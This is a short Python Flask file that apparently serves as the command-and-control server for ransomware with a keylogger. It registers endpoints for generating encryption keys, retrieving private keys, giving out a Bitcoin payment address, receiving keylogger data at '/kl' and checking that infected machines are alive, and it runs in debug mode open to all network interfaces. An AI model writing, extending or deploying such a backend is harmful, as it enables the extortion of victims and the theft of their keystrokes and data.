from flask import Flask
from flask_restful import Api
from API import KeyGen, KeyGetter, BTCAddressGetter, KeyLogger, isAlive

app = Flask(__name__)
api=Api(app)

api.add_resource(KeyGen, "/")
api.add_resource(KeyGetter, "/private_key")
api.add_resource(BTCAddressGetter, "/sendaddress")
api.add_resource(KeyLogger, "/kl")
api.add_resource(isAlive, "/alive")

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8080,debug=True)
